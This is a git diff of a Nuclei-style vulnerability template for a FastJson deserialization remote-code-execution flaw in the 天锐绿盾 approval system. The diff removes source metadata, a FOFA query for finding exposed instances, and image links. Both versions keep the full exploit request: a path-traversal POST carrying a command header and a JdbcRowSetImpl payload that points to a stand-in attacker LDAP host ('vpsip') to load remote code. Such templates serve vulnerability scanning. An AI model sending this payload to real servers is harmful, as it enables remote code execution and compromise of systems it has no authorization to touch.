@@ -3,15 +3,11 @@ info:
   name: 天锐绿盾审批系统 asign 存在FastJson反序列化RCE漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ny6iuodzmmf5a2xy'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ny6iuodzmmf5a2xy
-    fofa: app="TIPPAY-绿盾审批系统"
 http:
 - raw:
-  - "POST /trwfe/service/.%2E/rest/ext/mail/add/asign HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept-Encoding: gzip, deflate\nAccept: */*\nContent-Type: application/json\nConnection: keep-alive\ncmd: dir\n\n{\n    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n    \"dataSourceName\": \"ldap://vpsip:1389/TomcatBypass/TomcatEcho\",\n    \"autoCommit\": true\n}\n\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755944136736-4a85b2ff-8391-4fcc-bb1e-d68bff8aaf65.png)\n\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755944136955-98e2ac8c-da35-4d8c-ac57-8edf59ab60e6.png)"
+  - "POST /trwfe/service/.%2E/rest/ext/mail/add/asign HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\nAccept-Encoding: gzip, deflate\nAccept: */*\nContent-Type: application/json\nConnection: keep-alive\ncmd: dir\n\n{\n    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n    \"dataSourceName\": \"ldap://vpsip:1389/TomcatBypass/TomcatEcho\",\n    \"autoCommit\": true\n}"
   redirects: false
   matchers:
   - status:
